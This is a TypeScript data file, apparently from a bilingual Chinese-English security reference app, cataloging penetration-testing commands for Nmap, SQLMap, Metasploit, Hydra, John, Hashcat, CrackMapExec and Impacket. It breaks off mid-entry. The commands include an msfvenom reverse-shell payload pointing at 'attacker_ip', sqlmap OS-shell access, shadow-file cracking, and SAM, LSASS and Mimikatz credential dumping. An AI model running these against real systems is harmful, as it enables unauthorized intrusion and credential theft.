import type { ToolCommand } from '../types';
import { commandCatalogTools } from './commandCatalogTools.ts';
import { osToolCommandExtensions } from './osToolCommandExtensions.ts';

export const toolCommands: ToolCommand[] = [
  {
    id: 'nmap',
    name: 'Nmap',
    description: { zh: '网络扫描和安全审计工具', en: 'Network scanning and security auditing tool' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install nmap / yum install nmap / brew install nmap',
    commands: [
      {
        name: { zh: 'TCP连接扫描', en: 'TCP Connect Scan' },
        command: 'nmap -sT target_ip',
        description: { zh: '使用TCP连接方式进行端口扫描', en: 'Use TCP connection method to scan ports' },
        syntaxBreakdown: [
          { part: 'nmap', explanation: { zh: 'Nmap扫描工具', en: 'Nmap scanning tool' }, type: 'command' },
          { part: '-sT', explanation: { zh: 'TCP连接扫描模式', en: 'TCP connect scan mode' }, type: 'parameter' },
          { part: 'target_ip', explanation: { zh: '目标IP地址', en: 'Target IP address' }, type: 'value' }
        ],
        platform: 'all'
      },
      {
        name: { zh: 'SYN隐蔽扫描', en: 'SYN Stealth Scan' },
        command: 'nmap -sS target_ip',
        description: { zh: '使用SYN包进行隐蔽扫描，需要root权限', en: 'Use SYN packets for stealth scan, requires root' },
        syntaxBreakdown: [
          { part: '-sS', explanation: { zh: 'SYN扫描(半开扫描)，更隐蔽', en: 'SYN scan (half-open scan), more stealthy' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'UDP扫描', en: 'UDP Scan' },
        command: 'nmap -sU target_ip',
        description: { zh: '扫描UDP端口', en: 'Scan UDP ports' },
        syntaxBreakdown: [
          { part: '-sU', explanation: { zh: 'UDP扫描模式', en: 'UDP scan mode' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '服务版本探测', en: 'Service Version Detection' },
        command: 'nmap -sV target_ip',
        description: { zh: '探测开放端口的服务版本信息', en: 'Detect service version info on open ports' },
        syntaxBreakdown: [
          { part: '-sV', explanation: { zh: '服务版本探测', en: 'Service Version Detection' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '操作系统探测', en: 'OS Detection' },
        command: 'nmap -O target_ip',
        description: { zh: '尝试识别目标操作系统', en: 'Attempt to identify target OS' },
        syntaxBreakdown: [
          { part: '-O', explanation: { zh: '操作系统探测', en: 'OS Detection' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '全面扫描', en: 'Comprehensive Scan' },
        command: 'nmap -A target_ip',
        description: { zh: '启用高级功能进行全面扫描', en: 'Enable OS detection, version detection, script scan, and traceroute' },
        syntaxBreakdown: [
          { part: '-A', explanation: { zh: '启用OS检测、版本检测、脚本扫描和traceroute', en: 'Enable OS detection, version detection, script scan, and traceroute' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定端口扫描', en: 'Specified Port Scan' },
        command: 'nmap -p 22,80,443 target_ip',
        description: { zh: '只扫描指定的端口', en: 'Scan only specified ports' },
        syntaxBreakdown: [
          { part: '-p', explanation: { zh: '指定端口', en: 'Specify ports' }, type: 'parameter' },
          { part: '22,80,443', explanation: { zh: '端口号列表', en: 'Port number list' }, type: 'value' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '端口范围扫描', en: 'Port Range Scan' },
        command: 'nmap -p 1-1000 target_ip',
        description: { zh: '扫描指定范围的端口', en: 'Scan a specified port range' },
        syntaxBreakdown: [
          { part: '1-1000', explanation: { zh: '端口范围', en: 'Port range' }, type: 'value' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '脚本扫描', en: 'Script Scan' },
        command: 'nmap --script=vuln target_ip',
        description: { zh: '使用Nmap脚本引擎进行漏洞扫描', en: 'Use Nmap Script Engine for vulnerability scanning' },
        syntaxBreakdown: [
          { part: '--script=', explanation: { zh: '指定Nmap脚本', en: 'Specify Nmap script' }, type: 'parameter' },
          { part: 'vuln', explanation: { zh: '漏洞检测脚本类别', en: 'Vulnerability detection script category' }, type: 'value' }
        ],
        platform: 'all'
      },
      {
        name: { zh: 'SMB扫描', en: 'SMB Scan' },
        command: 'nmap --script=smb-enum-shares,smb-enum-users target_ip',
        description: { zh: '扫描SMB共享和用户信息', en: 'Scan SMB shares and user info' },
        platform: 'all'
      },
      {
        name: { zh: 'HTTP扫描', en: 'HTTP Scan' },
        command: 'nmap --script=http-enum,http-vuln* -p 80,443 target_ip',
        description: { zh: 'HTTP服务漏洞扫描', en: 'HTTP service vulnerability scan' },
        platform: 'all'
      },
      {
        name: { zh: '快速扫描', en: 'Fast Scan' },
        command: 'nmap -F target_ip',
        description: { zh: '快速扫描，只扫描常用端口', en: 'Fast scan, scans only common ports' },
        syntaxBreakdown: [
          { part: '-F', explanation: { zh: '快速模式，扫描常用100个端口', en: 'Fast mode, scans the 100 most common ports' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '扫描网段', en: 'Scan Network Segment' },
        command: 'nmap 192.168.1.0/24',
        description: { zh: '扫描整个网段', en: 'Scan the entire network segment' },
        syntaxBreakdown: [
          { part: '192.168.1.0/24', explanation: { zh: 'CIDR格式的网段', en: 'Network segment in CIDR notation' }, type: 'value' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '保存结果', en: 'Save Results' },
        command: 'nmap -oN output.txt target_ip',
        description: { zh: '将扫描结果保存到文件', en: 'Save scan results to a file' },
        syntaxBreakdown: [
          { part: '-oN', explanation: { zh: '普通格式输出', en: 'Normal format output' }, type: 'parameter' },
          { part: '-oX', explanation: { zh: 'XML格式输出', en: 'XML format output' }, type: 'parameter' },
          { part: '-oG', explanation: { zh: 'Grepable格式输出', en: 'Grepable format output' }, type: 'parameter' }
        ],
        platform: 'all'
      }
    ],
    references: ['https://nmap.org/docs.html']
  },
  {
    id: 'sqlmap',
    name: 'SQLMap',
    description: { zh: '自动化SQL注入工具', en: 'Automated SQL injection tool' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'apt install sqlmap / pip install sqlmap',
    commands: [
      {
        name: { zh: '基础测试', en: 'Basic Test' },
        command: 'sqlmap -u "http://target.com/page?id=1"',
        description: { zh: '对URL进行SQL注入测试', en: 'Test a URL for SQL injection' },
        syntaxBreakdown: [
          { part: 'sqlmap', explanation: { zh: 'SQLMap工具', en: 'SQLMap tool' }, type: 'command' },
          { part: '-u', explanation: { zh: '指定目标URL', en: 'Specify target URL' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定参数测试', en: 'Specified Parameter Test' },
        command: 'sqlmap -u "http://target.com/page?id=1&name=test" -p id',
        description: { zh: '只测试指定的参数', en: 'Test only the specified parameter' },
        syntaxBreakdown: [
          { part: '-p', explanation: { zh: '指定要测试的参数', en: 'Specify the parameter to test' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: 'POST请求测试', en: 'POST Request Test' },
        command: 'sqlmap -u "http://target.com/login" --data="user=admin&pass=123"',
        description: { zh: '测试POST请求', en: 'Test a POST request' },
        syntaxBreakdown: [
          { part: '--data=', explanation: { zh: 'POST数据', en: 'POST data' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '使用Cookie', en: 'Using Cookie' },
        command: 'sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=xxx"',
        description: { zh: '使用Cookie进行认证', en: 'Use a cookie for authentication' },
        syntaxBreakdown: [
          { part: '--cookie=', explanation: { zh: '设置Cookie', en: 'Set cookie' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定数据库类型', en: 'Specify Database Type' },
        command: 'sqlmap -u "http://target.com/page?id=1" --dbms=mysql',
        description: { zh: '指定后端数据库类型', en: 'Specify the backend database type' },
        syntaxBreakdown: [
          { part: '--dbms=', explanation: { zh: '数据库类型(mysql,mssql,oracle等)', en: 'Database type (mysql, mssql, oracle, etc.)' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '枚举数据库', en: 'Enumerate Databases' },
        command: 'sqlmap -u "http://target.com/page?id=1" --dbs',
        description: { zh: '获取所有数据库名', en: 'Get all database names' },
        syntaxBreakdown: [
          { part: '--dbs', explanation: { zh: '枚举数据库', en: 'Enumerate Databases' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '枚举表', en: 'Enumerate Tables' },
        command: 'sqlmap -u "http://target.com/page?id=1" -D database_name --tables',
        description: { zh: '获取指定数据库的表', en: 'Get tables in the specified database' },
        syntaxBreakdown: [
          { part: '-D', explanation: { zh: '指定数据库', en: 'specifiedDatabase' }, type: 'parameter' },
          { part: '--tables', explanation: { zh: '枚举表', en: 'Enumerate Tables' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '枚举列', en: 'Enumerate Columns' },
        command: 'sqlmap -u "http://target.com/page?id=1" -D db -T table --columns',
        description: { zh: '获取指定表的列', en: 'Get columns in the specified table' },
        syntaxBreakdown: [
          { part: '-T', explanation: { zh: '指定表', en: 'Specify table' }, type: 'parameter' },
          { part: '--columns', explanation: { zh: '枚举列', en: 'Enumerate Columns' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '提取数据', en: 'Extract Data' },
        command: 'sqlmap -u "http://target.com/page?id=1" -D db -T table -C col1,col2 --dump',
        description: { zh: '提取指定列的数据', en: 'Dump data from specified columns' },
        syntaxBreakdown: [
          { part: '-C', explanation: { zh: '指定列', en: 'Specify column' }, type: 'parameter' },
          { part: '--dump', explanation: { zh: '提取数据', en: 'Extract Data' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '获取Shell', en: 'Get Shell' },
        command: 'sqlmap -u "http://target.com/page?id=1" --os-shell',
        description: { zh: '尝试获取操作系统Shell', en: 'Attempt to get an interactive OS shell' },
        syntaxBreakdown: [
          { part: '--os-shell', explanation: { zh: '获取OS交互式Shell', en: 'Obtain an interactive OS shell' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '使用代理', en: 'Using Proxy' },
        command: 'sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"',
        description: { zh: '通过代理发送请求', en: 'Route requests through a proxy' },
        syntaxBreakdown: [
          { part: '--proxy=', explanation: { zh: '设置代理服务器', en: 'Set proxy server' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定注入技术', en: 'Specify Injection Technique' },
        command: 'sqlmap -u "http://target.com/page?id=1" --technique=BEUST',
        description: { zh: '指定注入技术类型', en: 'Specify injection technique type' },
        syntaxBreakdown: [
          { part: '--technique=', explanation: { zh: 'B=布尔盲注,E=报错注入,U=联合查询,S=堆叠,T=时间盲注', en: 'B=Boolean Blind,E=Error-Based,U=Union Query,S=Stacked Queries,T=Time-Based Blind' }, type: 'parameter' }
        ],
        platform: 'all'
      },
      {
        name: { zh: 'Level和Risk', en: 'Level and Risk' },
        command: 'sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3',
        description: { zh: '设置扫描级别和风险等级', en: 'Set scan level and risk level' },
        syntaxBreakdown: [
          { part: '--level=', explanation: { zh: '扫描级别(1-5)，越高越全面', en: 'Scan level (1-5), higher means more thorough' }, type: 'parameter' },
          { part: '--risk=', explanation: { zh: '风险等级(1-3)，越高越危险', en: 'Risk level (1-3), higher means more dangerous' }, type: 'parameter' }
        ],
        platform: 'all'
      }
    ],
    references: ['https://github.com/sqlmapproject/sqlmap/wiki/Usage']
  },
  {
    id: 'metasploit',
    name: 'Metasploit',
    description: { zh: '渗透测试框架', en: 'Penetration testing framework' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'apt install metasploit-framework',
    commands: [
      {
        name: { zh: '启动MSF', en: 'Launch MSF' },
        command: 'msfconsole',
        description: { zh: '启动Metasploit控制台', en: 'Start the Metasploit console' },
        platform: 'linux'
      },
      {
        name: { zh: '搜索模块', en: 'Search Modules' },
        command: 'search exploit apache',
        description: { zh: '搜索相关漏洞模块', en: 'Search for relevant vulnerability modules' },
        syntaxBreakdown: [
          { part: 'search', explanation: { zh: '搜索命令', en: 'Search command' }, type: 'command' },
          { part: 'exploit', explanation: { zh: '模块类型', en: 'Module type' }, type: 'value' },
          { part: 'apache', explanation: { zh: '搜索关键词', en: 'Search keyword' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '使用模块', en: 'Use Module' },
        command: 'use exploit/multi/handler',
        description: { zh: '选择要使用的模块', en: 'Select the module to use' },
        syntaxBreakdown: [
          { part: 'use', explanation: { zh: '使用模块命令', en: 'Use module command' }, type: 'command' },
          { part: 'exploit/multi/handler', explanation: { zh: '模块路径', en: 'Module path' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '查看选项', en: 'View Options' },
        command: 'show options',
        description: { zh: '显示模块配置选项', en: 'Display module configuration options' },
        syntaxBreakdown: [
          { part: 'show', explanation: { zh: '显示命令', en: 'Display command' }, type: 'command' },
          { part: 'options', explanation: { zh: '配置选项', en: 'Configurationoption' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '设置参数', en: 'Set Parameters' },
        command: 'set RHOSTS 192.168.1.100',
        description: { zh: '设置模块参数', en: 'Set module parameter' },
        syntaxBreakdown: [
          { part: 'set', explanation: { zh: '设置参数命令', en: 'Set parameters command' }, type: 'command' },
          { part: 'RHOSTS', explanation: { zh: '目标主机参数', en: 'Target hostParameter' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '设置Payload', en: 'Set Payload' },
        command: 'set PAYLOAD windows/meterpreter/reverse_tcp',
        description: { zh: '设置攻击载荷', en: 'Set the attack payload' },
        syntaxBreakdown: [
          { part: 'PAYLOAD', explanation: { zh: '载荷参数', en: 'Payload parameter' }, type: 'parameter' },
          { part: 'windows/meterpreter/reverse_tcp', explanation: { zh: '反向TCP连接的Meterpreter载荷', en: 'Reverse TCP Meterpreter payload' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '执行攻击', en: 'Execute Attack' },
        command: 'exploit',
        description: { zh: '执行攻击', en: 'Execute Attack' },
        syntaxBreakdown: [
          { part: 'exploit', explanation: { zh: '执行攻击命令', en: 'Execute attack command' }, type: 'command' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '后台运行', en: 'Run in Background' },
        command: 'exploit -j',
        description: { zh: '在后台执行攻击', en: 'Run the exploit as a background job' },
        syntaxBreakdown: [
          { part: '-j', explanation: { zh: '后台任务模式', en: 'Background job mode' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '生成Payload', en: 'Generate Payload' },
        command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe',
        description: { zh: '使用msfvenom生成恶意文件', en: 'Use msfvenom to generate a malicious file' },
        syntaxBreakdown: [
          { part: 'msfvenom', explanation: { zh: 'MSF载荷生成工具', en: 'MSF payload generator' }, type: 'command' },
          { part: '-p', explanation: { zh: '指定载荷', en: 'Specify payload' }, type: 'parameter' },
          { part: '-f exe', explanation: { zh: '输出格式', en: 'Output format' }, type: 'parameter' },
          { part: '-o', explanation: { zh: '输出文件', en: 'Output file' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'Meterpreter命令', en: 'Meterpreter Commands' },
        command: 'sysinfo\ngetuid\nhashdump',
        description: { zh: 'Meterpreter会话中的常用命令', en: 'Common commands used in Meterpreter sessions' },
        examples: [
          { zh: 'sysinfo - 系统信息', en: 'sysinfo - System Info' },
          { zh: 'getuid - 获取当前用户', en: 'getuid - Get current user' },
          { zh: 'hashdump - 导出哈希', en: 'hashdump - Dump password hashes' },
          { zh: 'shell - 获取系统Shell', en: 'shell - Get a system shell' },
          { zh: 'ps - 列出进程', en: 'ps - List processes' },
          { zh: 'migrate PID - 迁移进程', en: 'migrate PID - Migrate to another process' }
        ],
        platform: 'linux'
      }
    ],
    references: ['https://www.metasploitunleashed.com/']
  },
  {
    id: 'hydra',
    name: 'Hydra',
    description: { zh: '网络登录破解工具', en: 'Network login brute force tool' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install hydra',
    commands: [
      {
        name: { zh: 'SSH爆破', en: 'SSH Brute Force' },
        command: 'hydra -l user -P wordlist.txt ssh://target_ip',
        description: { zh: '使用用户名和密码字典爆破SSH', en: 'Brute force SSH with a username and password wordlist' },
        syntaxBreakdown: [
          { part: 'hydra', explanation: { zh: 'Hydra破解工具', en: 'Hydra brute force tool' }, type: 'command' },
          { part: '-l', explanation: { zh: '指定用户名', en: 'Specify username' }, type: 'parameter' },
          { part: '-L', explanation: { zh: '指定用户名字典文件', en: 'Specify username wordlist file' }, type: 'parameter' },
          { part: '-p', explanation: { zh: '指定密码', en: 'Specify password' }, type: 'parameter' },
          { part: '-P', explanation: { zh: '指定密码字典文件', en: 'Specify password wordlist file' }, type: 'parameter' },
          { part: 'ssh://', explanation: { zh: '目标服务协议', en: 'Target service protocol' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'FTP爆破', en: 'FTP Brute Force' },
        command: 'hydra -L users.txt -P passwords.txt ftp://target_ip',
        description: { zh: '爆破FTP服务', en: 'Brute force FTP service' },
        platform: 'linux'
      },
      {
        name: { zh: 'HTTP表单爆破', en: 'HTTP Form Brute Force' },
        command: 'hydra -l admin -P wordlist.txt target_ip http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"',
        description: { zh: '爆破HTTP表单登录', en: 'Brute force HTTP form login' },
        syntaxBreakdown: [
          { part: 'http-post-form', explanation: { zh: 'HTTP POST表单模块', en: 'HTTP POST form module' }, type: 'value' },
          { part: '^USER^', explanation: { zh: '用户名占位符', en: 'Username placeholder' }, type: 'value' },
          { part: '^PASS^', explanation: { zh: '密码占位符', en: 'Password placeholder' }, type: 'value' },
          { part: 'Invalid', explanation: { zh: '失败响应标识', en: 'Failure response marker' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'RDP爆破', en: 'RDP Brute Force' },
        command: 'hydra -l administrator -P wordlist.txt rdp://target_ip',
        description: { zh: '爆破RDP服务', en: 'Brute force RDP service' },
        platform: 'linux'
      },
      {
        name: { zh: 'MySQL爆破', en: 'MySQL Brute Force' },
        command: 'hydra -l root -P wordlist.txt mysql://target_ip',
        description: { zh: '爆破MySQL数据库', en: 'Brute force MySQL database' },
        platform: 'linux'
      },
      {
        name: { zh: '多线程', en: 'Multi-threaded' },
        command: 'hydra -t 4 -l user -P wordlist.txt ssh://target_ip',
        description: { zh: '指定线程数', en: 'Specify thread count' },
        syntaxBreakdown: [
          { part: '-t', explanation: { zh: '并发线程数', en: 'Concurrent thread count' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '继续中断的任务', en: 'Resume Interrupted Task' },
        command: 'hydra -R',
        description: { zh: '恢复之前中断的任务', en: 'Resume a previously interrupted task' },
        syntaxBreakdown: [
          { part: '-R', explanation: { zh: '恢复任务', en: 'Resume interrupted task' }, type: 'parameter' }
        ],
        platform: 'linux'
      }
    ],
    references: ['https://github.com/vanhauser-thc/thc-hydra']
  },
  {
    id: 'john',
    name: 'John the Ripper',
    description: { zh: '密码破解工具', en: 'Password cracking tool' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install john',
    commands: [
      {
        name: { zh: '破解哈希', en: 'Crack Hash' },
        command: 'john --wordlist=wordlist.txt hash.txt',
        description: { zh: '使用字典破解哈希', en: 'Crack hashes using a wordlist' },
        syntaxBreakdown: [
          { part: 'john', explanation: { zh: 'John破解工具', en: 'John the Ripper tool' }, type: 'command' },
          { part: '--wordlist=', explanation: { zh: '指定字典文件', en: 'Specify wordlist file' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '自动识别格式', en: 'Auto-detect Format' },
        command: 'john --wordlist=wordlist.txt --format=raw-md5 hash.txt',
        description: { zh: '指定哈希格式', en: 'Specify hash format' },
        syntaxBreakdown: [
          { part: '--format=', explanation: { zh: '指定哈希格式', en: 'Specify hash format' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '显示破解结果', en: 'Show Cracked Results' },
        command: 'john --show hash.txt',
        description: { zh: '显示已破解的密码', en: 'Display already cracked passwords' },
        syntaxBreakdown: [
          { part: '--show', explanation: { zh: '显示结果', en: 'Show Results' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '破解Shadow文件', en: 'Crack Shadow File' },
        command: 'unshadow /etc/passwd /etc/shadow > mypasswd\njohn --wordlist=wordlist.txt mypasswd',
        description: { zh: '破解Linux密码文件', en: 'Crack the Linux password file' },
        syntaxBreakdown: [
          { part: 'unshadow', explanation: { zh: '合并passwd和shadow文件', en: 'Merge passwd and shadow files' }, type: 'command' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '破解ZIP密码', en: 'Crack ZIP Password' },
        command: 'zip2john protected.zip > zip.hash\njohn --wordlist=wordlist.txt zip.hash',
        description: { zh: '破解ZIP文件密码', en: 'Crack a ZIP file password' },
        syntaxBreakdown: [
          { part: 'zip2john', explanation: { zh: '提取ZIP密码哈希', en: 'Extract ZIP file password hash' }, type: 'command' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '破解RAR密码', en: 'Crack RAR Password' },
        command: 'rar2john protected.rar > rar.hash\njohn --wordlist=wordlist.txt rar.hash',
        description: { zh: '破解RAR文件密码', en: 'Crack a RAR file password' },
        platform: 'linux'
      },
      {
        name: { zh: '破解SSH密钥', en: 'Crack SSH Key' },
        command: 'ssh2john id_rsa > ssh.hash\njohn --wordlist=wordlist.txt ssh.hash',
        description: { zh: '破解SSH私钥密码', en: 'Crack the SSH private key passphrase' },
        platform: 'linux'
      },
      {
        name: { zh: '暴力破解', en: 'Brute Force' },
        command: 'john --incremental hash.txt',
        description: { zh: '使用暴力破解模式', en: 'Use brute force mode' },
        syntaxBreakdown: [
          { part: '--incremental', explanation: { zh: '暴力破解模式', en: 'Brute force mode' }, type: 'parameter' }
        ],
        platform: 'linux'
      }
    ],
    references: ['https://www.openwall.com/john/doc/']
  },
  {
    id: 'hashcat',
    name: 'Hashcat',
    description: { zh: 'GPU加速密码破解工具', en: 'GPU-accelerated password cracking tool' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install hashcat',
    commands: [
      {
        name: { zh: '基础破解', en: 'Basic Cracking' },
        command: 'hashcat -m 0 -a 0 hash.txt wordlist.txt',
        description: { zh: '使用字典破解MD5哈希', en: 'Crack MD5 hashes using a wordlist' },
        syntaxBreakdown: [
          { part: 'hashcat', explanation: { zh: 'Hashcat破解工具', en: 'Hashcat cracking tool' }, type: 'command' },
          { part: '-m 0', explanation: { zh: '哈希类型(MD5)', en: 'Hash type (MD5)' }, type: 'parameter' },
          { part: '-a 0', explanation: { zh: '攻击模式(字典攻击)', en: 'Attack mode (dictionary attack)' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '攻击模式', en: 'Attack Mode' },
        command: 'hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a',
        description: { zh: '暴力破解模式', en: 'Brute force mode' },
        syntaxBreakdown: [
          { part: '-a 3', explanation: { zh: '暴力破解模式', en: 'Brute force mode' }, type: 'parameter' },
          { part: '?a', explanation: { zh: '所有字符掩码', en: 'All-character mask' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '掩码字符集', en: 'Mask Character Set' },
        command: '?l = abcdefghijklmnopqrstuvwxyz\n?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ\n?d = 0123456789\n?s = 特殊字符\n?a = 所有字符\n?b = 0x00-0xff',
        description: { zh: '掩码字符集说明', en: 'Mask character set reference' },
        platform: 'all'
      },
      {
        name: { zh: '规则攻击', en: 'Rule Attack' },
        command: 'hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule',
        description: { zh: '使用规则文件进行破解', en: 'Use a rule file for cracking' },
        syntaxBreakdown: [
          { part: '-r', explanation: { zh: '指定规则文件', en: 'Specify rule file' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '组合攻击', en: 'Combination Attack' },
        command: 'hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt',
        description: { zh: '组合两个字典', en: 'Combine two dictionaries' },
        syntaxBreakdown: [
          { part: '-a 1', explanation: { zh: '组合攻击模式', en: 'Combination attack mode' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '常用哈希类型', en: 'Common Hash Types' },
        command: '-m 0 = MD5\n-m 100 = SHA1\n-m 1400 = SHA256\n-m 1700 = SHA512\n-m 1000 = NTLM\n-m 1800 = SHA512crypt\n-m 3200 = bcrypt\n-m 5600 = NetNTLMv2\n-m 13100 = Kerberos TGS',
        description: { zh: '常用哈希类型编号', en: 'Common hash type codes' },
        platform: 'all'
      },
      {
        name: { zh: '显示结果', en: 'Show Results' },
        command: 'hashcat -m 0 hash.txt --show',
        description: { zh: '显示已破解的结果', en: 'Show already cracked results' },
        platform: 'linux'
      },
      {
        name: { zh: '基准测试', en: 'Benchmark' },
        command: 'hashcat -b',
        description: { zh: '测试GPU性能', en: 'Benchmark GPU performance' },
        platform: 'linux'
      }
    ],
    references: ['https://hashcat.net/wiki/']
  },
  {
    id: 'crackmapexec',
    name: 'CrackMapExec',
    description: { zh: '内网渗透瑞士军刀', en: 'Swiss army knife for intranet penetration' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'pip install crackmapexec',
    commands: [
      {
        name: { zh: 'SMB扫描', en: 'SMB Scan' },
        command: 'crackmapexec smb 192.168.1.0/24',
        description: { zh: '扫描网段内的SMB服务', en: 'Scan SMB services across a network segment' },
        syntaxBreakdown: [
          { part: 'crackmapexec', explanation: { zh: 'CME工具', en: 'CrackMapExec tool' }, type: 'command' },
          { part: 'smb', explanation: { zh: 'SMB协议模块', en: 'SMB protocol module' }, type: 'value' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '密码喷洒', en: 'Password Spraying' },
        command: 'crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123',
        description: { zh: '使用单个密码测试多个用户', en: 'Test multiple users with a single password' },
        syntaxBreakdown: [
          { part: '-u', explanation: { zh: '用户名或用户文件', en: 'Username or username file' }, type: 'parameter' },
          { part: '-p', explanation: { zh: '密码或密码文件', en: 'Password or password file' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '凭证测试', en: 'Credential Testing' },
        command: 'crackmapexec smb 192.168.1.0/24 -u admin -p password',
        description: { zh: '测试凭证是否有效', en: 'Test whether credentials are valid' },
        platform: 'linux'
      },
      {
        name: 'Pass-the-Hash',
        command: 'crackmapexec smb 192.168.1.0/24 -u admin -H NTHASH',
        description: { zh: '使用哈希进行认证', en: 'Authenticate using NTLM hash' },
        syntaxBreakdown: [
          { part: '-H', explanation: { zh: 'NTLM哈希', en: 'NTLM hash' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '执行命令', en: 'Execute Command' },
        command: 'crackmapexec smb 192.168.1.100 -u admin -p password -x "whoami"',
        description: { zh: '在目标机器执行命令', en: 'Execute a command on the target machine' },
        syntaxBreakdown: [
          { part: '-x', explanation: { zh: '执行命令', en: 'Execute Command' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '执行PowerShell', en: 'Execute PowerShell' },
        command: 'crackmapexec smb 192.168.1.100 -u admin -p password -X "Get-Process"',
        description: { zh: '在目标机器执行PowerShell', en: 'Execute PowerShell on the target machine' },
        syntaxBreakdown: [
          { part: '-X', explanation: { zh: '执行PowerShell命令', en: 'Execute PowerShell command' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: 'Dump SAM',
        command: 'crackmapexec smb 192.168.1.100 -u admin -p password --sam',
        description: { zh: '导出SAM数据库', en: 'Export SAM database' },
        platform: 'linux'
      },
      {
        name: 'Dump LSASS',
        command: 'crackmapexec smb 192.168.1.100 -u admin -p password --lsa',
        description: { zh: '导出LSASS凭证', en: 'Export LSASS credentials' },
        platform: 'linux'
      },
      {
        name: 'Mimikatz',
        command: 'crackmapexec smb 192.168.1.100 -u admin -p password -M mimikatz',
        description: { zh: '执行Mimikatz模块', en: 'Execute Mimikatz module' },
        syntaxBreakdown: [
          { part: '-M', explanation: { zh: '指定模块', en: 'Specify Module' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: 'WinRM',
        command: 'crackmapexec winrm 192.168.1.100 -u admin -p password',
        description: { zh: '通过WinRM执行命令', en: 'Execute commands via WinRM' },
        platform: 'linux'
      }
    ],
    references: ['https://mpgn.gitbook.io/crackmapexec/']
  },
  {
    id: 'impacket',
    name: 'Impacket',
    description: { zh: 'Python网络协议库', en: 'Python network protocol library' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'pip install impacket',
    commands: [
      {
        name: 'PsExec',
        command: 'psexec.py domain/user:password@target_ip',
        description: { zh: 'PsExec远程执行', en: 'Remote code execution via PsExec' },
        platform: 'linux'
      },
      {
        name: 'WMIExec',
        command: 'wmiexec.py domain/user:password@target_ip',
        description: { zh: 'WMI远程执行', en: 'Remote execution via WMI' },
        platform: 'linux'
      },
      {
        name: 'ATExec',
        command: 'atexec.py domain/user:password@target_ip "command"',
        description: { zh: '通过计划任务执行', en: 'Execute via scheduled task' },
        platform: 'linux'
      },
      {
        name: 'SMBExec',
        command: 'smbexec.py domain/user:password@target_ip',
        description: { zh: 'SMB远程执行', en: 'Remote execution via SMB' },
        platform: 'linux'
      },
      {
        name: 'SecretsDump',
